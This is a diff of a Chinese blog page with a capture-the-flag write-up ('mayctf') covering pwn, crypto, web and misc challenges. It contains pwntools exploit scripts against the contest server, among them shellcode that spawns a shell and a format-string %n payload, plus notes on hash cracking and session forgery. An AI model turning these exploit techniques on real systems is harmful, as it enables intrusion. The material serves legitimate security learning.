 </div><p>a secret makes a woman woman. 秘密造就女人. 出自名侦探柯南中的贝尔蒙德(苦艾酒).
 如果这道题有疑问可以阅读CS:APP第二章.</p>
-<h3 id="get_my_float">get_my_float</h3>
-<p>看下源代码: 注意这是个union而不是struct, 我一开始在这卡了半天.</p>
+<h3 id="get_my_float" class="headerLink">
+    <a href="#get_my_float" class="header-mark"></a>get_my_float</h3><p>看下源代码: 注意这是个union而不是struct, 我一开始在这卡了半天.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -3498,19 +3497,19 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;please give me the core float!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;please give me the core float!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">gundam</span><span class="p">.</span><span class="n">ch</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gundam</span><span class="p">.</span><span class="n">ch</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
@@ -3520,15 +3519,15 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Gundam Rising!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Gundam Rising!!&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cat /tmp/flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;cat /tmp/flag&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="k">else</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;false!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;false!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
@@ -3559,13 +3558,13 @@ IDA看一眼主函数里执行了个message</p>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#34;124.220.41.254&#34;</span><span class="p">,</span><span class="mi">12352</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="s">&#34;124.220.41.254&#34;</span><span class="p">,</span><span class="mi">12352</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3FE3C6A7EF9DB22D</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x3FE3C6A7EF9DB22D</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">#https:</span><span class="c1">//tooltt.com/floatconverter/
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
@@ -3573,8 +3572,8 @@ IDA看一眼主函数里执行了个message</p>
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>flag是高达相关, 没看过不懂.</p>
-<h3 id="cuora_and_her_shell">cuora_and_her_shell</h3>
-<p>依然给了源代码</p>
+<h3 id="cuora_and_her_shell" class="headerLink">
+    <a href="#cuora_and_her_shell" class="header-mark"></a>cuora_and_her_shell</h3><p>依然给了源代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -3620,19 +3619,19 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;where is my shell?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;where is my shell?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span>  <span class="n">map</span><span class="p">[</span><span class="mi">200</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">fread</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="mi">200</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fread</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="mi">200</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
@@ -3671,25 +3670,25 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nf">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">debug</span><span class="err">&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">amd64</span><span class="err">&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">linux</span><span class="err">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="k">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="k">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#34;124.220.41.254&#34;</span><span class="p">,</span><span class="mi">12353</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="s">&#34;124.220.41.254&#34;</span><span class="p">,</span><span class="mi">12353</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">b</span><span class="sc">&#39;a&#39;</span> <span class="o">*</span><span class="mi">200</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">#flag</span><span class="p">{</span><span class="mi">4</span><span class="n">sian_box_turtles_are_terrestrial_semiaquatic_0r_mainly_aquatic</span><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="群英萃">群英萃</h1>
-<h2 id="crypto-1">crypto</h2>
-<h3 id="step_in">step_in</h3>
-<p>$$c^e\equiv m(mod n)$$
+</div><h1 id="群英萃" class="headerLink">
+    <a href="#%e7%be%a4%e8%8b%b1%e8%90%83" class="header-mark"></a>群英萃</h1><h2 id="crypto-1" class="headerLink">
+    <a href="#crypto-1" class="header-mark"></a>crypto</h2><h3 id="step_in" class="headerLink">
+    <a href="#step_in" class="header-mark"></a>step_in</h3><p>$$c^e\equiv m(mod n)$$
 求e, 这是一个离散对数问题, 两边取c底对数即可
 <a href="https://postimg.cc/s1htJ4kf" target="_blank" rel="noopener noreffer "><img
         class="lazyload"
@@ -3699,8 +3698,8 @@ IDA看一眼主函数里执行了个message</p>
         data-sizes="auto"
         alt="https://i.postimg.cc/fW2DDH5d/QL3-TZL7-47-FR1-J-E-A.png"
         title="QL3-TZL7-47-FR1-J-E-A.png" /></a></p>
-<h3 id="maybersa">maybeRSA</h3>
-<div class="highlight"><div class="chroma">
+<h3 id="maybersa" class="headerLink">
+    <a href="#maybersa" class="header-mark"></a>maybeRSA</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -3766,8 +3765,8 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="x_or_mia">X_or_Mia</h3>
-<p>encryption里给了一段经过异或的message, 看xor那个函数和下面的assert可以发现key有11位且只含字母和数字(isalnum函数), 循环地依次和原message异或, 那么由于我们知道message的前几位是mayctf{, 根据异或可逆性可以逆出前七位key是&quot;1loveyo&quot;, 还剩四位本打算写个搜索生成一下然后肉眼找, 结果写挂了, 怒而直接key是i1loveyoumia, 试了一下发现是正确的.</p>
+</div><h3 id="x_or_mia" class="headerLink">
+    <a href="#x_or_mia" class="header-mark"></a>X_or_Mia</h3><p>encryption里给了一段经过异或的message, 看xor那个函数和下面的assert可以发现key有11位且只含字母和数字(isalnum函数), 循环地依次和原message异或, 那么由于我们知道message的前几位是mayctf{, 根据异或可逆性可以逆出前七位key是&quot;1loveyo&quot;, 还剩四位本打算写个搜索生成一下然后肉眼找, 结果写挂了, 怒而直接key是i1loveyoumia, 试了一下发现是正确的.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -3912,23 +3911,23 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl">        <span class="n">d</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="web-1">web</h2>
-<p>都是logchar写的</p>
-<h3 id="学籍管理--logchar">学籍管理  (logchar)</h3>
-<p>这两篇博客讲的很详细了捏<br>
+</div><h2 id="web-1" class="headerLink">
+    <a href="#web-1" class="header-mark"></a>web</h2><p>都是logchar写的</p>
+<h3 id="学籍管理--logchar" class="headerLink">
+    <a href="#%e5%ad%a6%e7%b1%8d%e7%ae%a1%e7%90%86--logchar" class="header-mark"></a>学籍管理  (logchar)</h3><p>这两篇博客讲的很详细了捏<br>
 <a href="https://blog.csdn.net/weixin_44190459/article/details/116774912" target="_blank" rel="noopener noreffer ">漏洞讲解</a><br>
 <a href="https://blog.csdn.net/weixin_52116519/article/details/124338506" target="_blank" rel="noopener noreffer ">session伪造</a></p>
-<h3 id="cryt_or_web--logchar">cryt_or_web  (logchar)</h3>
-<p>在下发的![](file:///C:\Users\JuicyMio\AppData\Roaming\Tencent\QQ\Temp%W@GJ$ACOF(TYDYECOKVDYB.png)app.py中，按照给出的解码方法将给出的cipher_text解码。<br>
+<h3 id="cryt_or_web--logchar" class="headerLink">
+    <a href="#cryt_or_web--logchar" class="header-mark"></a>cryt_or_web  (logchar)</h3><p>在下发的![](file:///C:\Users\JuicyMio\AppData\Roaming\Tencent\QQ\Temp%W@GJ$ACOF(TYDYECOKVDYB.png)app.py中，按照给出的解码方法将给出的cipher_text解码。<br>
 得到提示后，构造POST请求包。(注意POST包中必要的Content-Type和Content-Length内容)<br>
 成功用POST上传KEY值后，页面自动跳转，观察可以发现首字母组成了flag，并暗示了解码方式<del>最后注意区分I和l (qwq!)</del></p>
-<h2 id="misc-1">misc</h2>
-<h3 id="checkin--noir">checkin  (noir)</h3>
-<p>  虽然是签到题，但我一开始没想到按f12，，，按了之后得到密文和掩码，给hashcat跑了之后得到当天的密码972513，再随便找个学号加上这个用md5加密得到密文然后登陆即可。          </p>
-<h3 id="幽霊楽団phantomensemble--noir">幽霊楽団～Phantom Ensemble  (noir)</h3>
-<p>开始先听了一下，没听出来啥，放进Audacity观察了一下频谱和波形图也没看出来啥。然后发现一个四分多钟的wav竟然有50mb，应该是隐写了文件。放进SlientEye，decode出来一个actually in here 文件，里面有一个音频文件和图片。音频继续放进SlientEye，decode出一个in here音频，听了一下，是摩斯电码，放进Audacity，放大波形图，就可以根据波形图得出摩斯电码，翻译之后得到PASSWORDISCUTE+DARKFLYING.JPG，图片很容易上看到rumia，得到密码cuterumia，密码是得到了，但是要解啥呢？想起来in here音频还没放进过SlientEye，decode得到一个加密压缩包，用cuterumia解开得到flag Orz</p>
-<h3 id="鬼人挑战2">鬼人挑战2</h3>
-<p>根据2.piz和看hex值, 可以发现zip文件头倒着在文件结尾, 文件是整个按字节倒过来的, 所以写个脚本把它倒回去. 倒回来用zip打开发现里面是个yp.ssencnirp, 容易猜到也是倒过来, flag在里面info_text那里. 发现是每隔一个字符取一个字符.</p>
+<h2 id="misc-1" class="headerLink">
+    <a href="#misc-1" class="header-mark"></a>misc</h2><h3 id="checkin--noir" class="headerLink">
+    <a href="#checkin--noir" class="header-mark"></a>checkin  (noir)</h3><p>  虽然是签到题，但我一开始没想到按f12，，，按了之后得到密文和掩码，给hashcat跑了之后得到当天的密码972513，再随便找个学号加上这个用md5加密得到密文然后登陆即可。          </p>
+<h3 id="幽霊楽団phantomensemble--noir" class="headerLink">
+    <a href="#%e5%b9%bd%e9%9c%8a%e6%a5%bd%e5%9b%a3phantomensemble--noir" class="header-mark"></a>幽霊楽団～Phantom Ensemble  (noir)</h3><p>开始先听了一下，没听出来啥，放进Audacity观察了一下频谱和波形图也没看出来啥。然后发现一个四分多钟的wav竟然有50mb，应该是隐写了文件。放进SlientEye，decode出来一个actually in here 文件，里面有一个音频文件和图片。音频继续放进SlientEye，decode出一个in here音频，听了一下，是摩斯电码，放进Audacity，放大波形图，就可以根据波形图得出摩斯电码，翻译之后得到PASSWORDISCUTE+DARKFLYING.JPG，图片很容易上看到rumia，得到密码cuterumia，密码是得到了，但是要解啥呢？想起来in here音频还没放进过SlientEye，decode得到一个加密压缩包，用cuterumia解开得到flag Orz</p>
+<h3 id="鬼人挑战2" class="headerLink">
+    <a href="#%e9%ac%bc%e4%ba%ba%e6%8c%91%e6%88%982" class="header-mark"></a>鬼人挑战2</h3><p>根据2.piz和看hex值, 可以发现zip文件头倒着在文件结尾, 文件是整个按字节倒过来的, 所以写个脚本把它倒回去. 倒回来用zip打开发现里面是个yp.ssencnirp, 容易猜到也是倒过来, flag在里面info_text那里. 发现是每隔一个字符取一个字符.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -4013,8 +4012,8 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl"><span class="n">w2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="禁忌-四重存在">禁忌 四重存在</h3>
-<p>我愿称这题为<strong>接头霸王</strong>, 因为该有的文件头一个都没有.
+</div><h3 id="禁忌-四重存在" class="headerLink">
+    <a href="#%e7%a6%81%e5%bf%8c-%e5%9b%9b%e9%87%8d%e5%ad%98%e5%9c%a8" class="header-mark"></a>禁忌 四重存在</h3><p>我愿称这题为<strong>接头霸王</strong>, 因为该有的文件头一个都没有.
 题目给的文件是个png, 用binwalk之类的东西什么都分不出来, 但是可以查到一个zip的文件尾, 估计zip文件头被去掉了. 于是我尝试搜索zip文件头后面的部分.</p>
 <blockquote>
 <p>14 00：解压文件所需 pkware 版本<br>
@@ -4036,17 +4035,17 @@ IDA看一眼主函数里执行了个message</p>
 此时只剩下最后一部分, 在刚刚的CHAMPION_FLAN前面是FFD9, 即jpg文件尾, 不出意外的是它也没头&hellip;但出意外的是它连脖子都没了, 直接在PNG的文件尾后面加JPG文件头再导出, jpg文件还是损坏的, 我注意到了jpg文件前面的附近有一个&quot;Adobe&quot;, 便呼叫队友用PS生成一张jpg发给我, 用winhex打开找到PNG文件后面的&quot;DB 00 84 00&quot;, 将前面的内容复制下来给jpg接上了头, 得到了flag的最后一部分. 接上的头内容如下:
 FFD8FFEE002141646F62650064800000000103001003020306000000000000000000000000FF
 虽然看着wp内容很短, 但是翻来覆去找头找尾的过程属实折磨.</p>
-<h3 id="mia_is_gaming">mia_is_gaming</h3>
-<p>主要是队友社的, 我就最后进行了一个git仓库的回滚, 其他的给他写了.
+<h3 id="mia_is_gaming" class="headerLink">
+    <a href="#mia_is_gaming" class="header-mark"></a>mia_is_gaming</h3><p>主要是队友社的, 我就最后进行了一个git仓库的回滚, 其他的给他写了.
 仓库的.git的.被删了 加上
 翻一下log找到add flag那条提交的哈希然后回溯
 git reset &ndash;hard 9b500572926b59d6d42e23714d1b43ad73b52e24
 flag就被恢复了</p>
-<h2 id="reverse-1">reverse</h2>
-<p>挂零了, 没wp可写(哭</p>
-<h2 id="pwn-1">pwn</h2>
-<h3 id="fmt">fmt</h3>
-<p>没给源代码, IDA分析一下看到要利用格式化字符串漏洞覆盖v4, v5, v6的值. checksec看了各种保护都开了, 所以栈地址都是随机化的.
+<h2 id="reverse-1" class="headerLink">
+    <a href="#reverse-1" class="header-mark"></a>reverse</h2><p>挂零了, 没wp可写(哭</p>
+<h2 id="pwn-1" class="headerLink">
+    <a href="#pwn-1" class="header-mark"></a>pwn</h2><h3 id="fmt" class="headerLink">
+    <a href="#fmt" class="header-mark"></a>fmt</h3><p>没给源代码, IDA分析一下看到要利用格式化字符串漏洞覆盖v4, v5, v6的值. checksec看了各种保护都开了, 所以栈地址都是随机化的.
 一通尝试之后发现了<a href="https://blog.csdn.net/weixin_43092232/article/details/106205344" target="_blank" rel="noopener noreffer ">这个</a>, 利用%n可以在printf里将第n个参数作为地址, 向其中写入目前成功打印了的字符个数, 而且%n本身不会打印字符. 而printf的前三个参数恰好是&amp;v4, &amp;v5, &amp;v6. 题目要求v4, v5, v6的值也是升序的, 所以可以直接利用这个构造格式化字符串<code>aaaa%1$naa%2$naa%3$n</code>. exp如下</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -4156,7 +4155,7 @@ flag就被恢复了</p>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
-                            <a class="link-to-markdown" href="/mayctf_writeup/index.md" target="_blank">Read Markdown</a>
+                            <a class="link-to-markdown" href="/mayctf_writeup/index.md" target="_blank">Read markdown</a>
                         </span></div>
             <div class="post-info-share">
                 <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://juicymio.github.io/mayctf_writeup/" data-title="mayctf writeup by Mio and K-ON!"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://juicymio.github.io/mayctf_writeup/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://juicymio.github.io/mayctf_writeup/" data-title="mayctf writeup by Mio and K-ON!" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://juicymio.github.io/mayctf_writeup/" data-title="mayctf writeup by Mio and K-ON!"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://juicymio.github.io/mayctf_writeup/" data-title="mayctf writeup by Mio and K-ON!"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://juicymio.github.io/mayctf_writeup/" data-title="mayctf writeup by Mio and K-ON!" data-description=""><i class="fab fa-blogger fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://juicymio.github.io/mayctf_writeup/" data-title="mayctf writeup by Mio and K-ON!"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
@@ -4176,7 +4175,7 @@ flag就被恢复了</p>
 </div>
 <div id="comments"></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.104.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">
                 </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">JuicyMio</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
